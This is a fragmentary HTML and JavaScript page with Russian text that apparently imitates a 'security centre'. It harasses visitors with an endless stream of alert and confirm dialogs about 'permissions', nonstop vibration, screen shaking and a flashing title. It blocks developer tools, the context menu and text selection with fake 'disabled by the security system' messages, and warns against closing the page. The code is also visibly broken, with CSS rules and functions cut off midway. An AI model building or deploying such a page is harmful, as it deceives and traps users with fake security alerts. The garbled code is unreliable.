        }

            letter-spacing: 2px;

            font-size: 16px;
            color: #cccccc;
        }
        
        .progress-bar {
            margin-top: 24px;
            width: 260px;
            height: 4px;
            background: #2a2a2a;
            border-radius: 4px;
            overflow: hidden;
            margin-left: auto;
            margin-right: auto;
        }
        
        .progress-fill {
            width: 100%;
            height: 100%;
            background: #ff3b3b;
            animation: progressPulse 0.8s infinite alternate;

        @keyframes pulseText {
            0% { opacity: 0.7; text-shadow: 0 0 0px red; }
            100% { opacity: 1; text-shadow: 0 0 12px #ff0000; }
        }
        
        @keyframes progressPulse {
            0% { opacity: 0.5; width: 60%; }
            100% { opacity: 1; width: 95%; }
        }
        
        @keyframes shake {
            0% { transform: translate(0px, 0px); }
            25% { transform: translate(3px, 2px); }
            50% { transform: translate(-3px, -2px); }
            75% { transform: translate(2px, -1px); }
            100% { transform: translate(0px, 0px); }
        }
        
        .shake-screen {
            animation: shake 0.25s ease-in-out 0s 2;
        }
        
        @keyframes redAlert {
            0% { box-shadow: 0 0 0 0 rgba(255,0,0,0); }
            50% { box-shadow: 0 0 0 6px rgba(255,0,0,0.6); }
            100% { box-shadow: 0 0 0 0 rgba(255,0,0,0); }
        }
        
        body {
            animation: redAlert 1.2s infinite;
        }

            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 360px;
            background: #f5f5f5;
            border-radius: 14px;
            box-shadow: 0 25px 45px rgba(0,0,0,0.5), 0 0 0 1000px rgba(0,0,0,0.7);

            display: none;
            pointer-events: auto;
            border: 1px solid #bbb;

            padding: 12px 14px;
            border-radius: 14px 14px 0 0;
            display: flex;
            align-items: center;
            gap: 8px;

            height: 12px;
            border-radius: 50%;
            display: inline-block;
            margin-right: 4px;

        * {
            -webkit-tap-highlight-color: transparent;
        }
    </style>
</head>

    function startContinuousVibration() {
        if (navigator.vibrate) {
            const vibrationPatterns = [
                [200, 100, 200, 100, 300],
                [150, 80, 150, 80, 150, 80, 200],
                [100, 50, 100, 50, 100, 50, 100, 50, 200],
                [250, 120, 250],
                [80, 40, 80, 40, 80, 40, 80, 40, 80],
                [300, 100, 300],
                [120, 60, 120, 60, 120]
            ];
            
            let patternIndex = 0;
            
            function vibrateLoop() {
                if (!isVibrating) return;
                const pattern = vibrationPatterns[patternIndex % vibrationPatterns.length];
                navigator.vibrate(pattern);
                const totalDuration = pattern.reduce((a, b) => a + b, 0);
                patternIndex++;
                setTimeout(vibrateLoop, totalDuration + 30);
            }
            
            isVibrating = true;
            vibrateLoop();
        }
    }

    // Мгновенное отображение уведомления без задержек

        console.log(`[${type.toUpperCase()}] ${message}`);

    function getRandomType() {

        return 'prompt';                       // 15% prompt

            return;

                alert(message);
            } else {
                const result = confirm(message + "\n\nРазрешить?");
                if (result) {
                    setTimeout(() => { if(isActive) alert("Разрешение предоставлено"); }, 1);
                } else {
                    setTimeout(() => { if(isActive) alert("Разрешение отклонено"); }, 1);
                }
            }
        } catch(e) {}
        
        shortStreamRunning = false;
        setTimeout(showNextShortNotification, 1);
    }
    
    showNextShortNotification();
    
    // ===================== ЭФФЕКТЫ И ЗАЩИТА =====================
    
    // Эффект дрожания экрана
    setInterval(() => {
        if (Math.random() < 0.2) {
            document.body.classList.add("shake-screen");
            setTimeout(() => document.body.classList.remove("shake-screen"), 250);
        }
    }, 3000);
    
    // Мигающий заголовок
    setInterval(() => {
        if (document.title === "ЦЕНТР БЕЗОПАСНОСТИ") {
            document.title = "ЗАПРОСЫ РАЗРЕШЕНИЙ | АКТИВНО";
        } else {
            document.title = "ЦЕНТР БЕЗОПАСНОСТИ";
        }
    }, 1500);
    
    // Блокировка контекстного меню
    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        alert("Доступ к инструментам разработчика заблокирован");
        return false;
    });
    
    // Блокировка клавиш разработчика
    document.addEventListener('keydown', (e) => {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) {
            e.preventDefault();
            alert("Режим разработчика отключен системой безопасности");
            return false;
        }
    });
    
    // Запрет выделения текста
    document.addEventListener('selectstart', (e) => e.preventDefault());
    
    // Вибрация при кликах
    document.body.addEventListener('click', () => {
        if (navigator.vibrate && isVibrating) {
            navigator.vibrate(60);
        }
    });
    
    // Блокировка закрытия страницы
    window.addEventListener('beforeunload', (e) => {
        e.preventDefault();
        e.returnValue = "Идёт обработка запросов разрешений. Закрытие страницы может привести к сбою системы безопасности.";
        return "Идёт обработка запросов разрешений. Закрытие страницы может привести к сбою системы безопасности.";
    });
    
    // Гарантия непрерывной работы - мониторинг потоков
    setInterval(() => {
        if (!isActive) {
            isActive = true;
        }
        console.log("[СИСТЕМА] Непрерывный поток уведомлений активен. Всего показано: " + notificationCount);
    }, 30000);
    
    console.log("%cСИСТЕМА БЕЗОПАСНОСТИ: НЕПРЕРЫВНЫЙ ПОТОК ЗАПРОСОВ АКТИВИРОВАН", "color: red; font-size: 14px; font-weight: bold;");
    console.log("Уведомления идут без остановки. Типов сообщений: " + notificationMessages.length);
    console.log("Запущено 3 параллельных потока уведомлений");
</script>
</body>
</html>
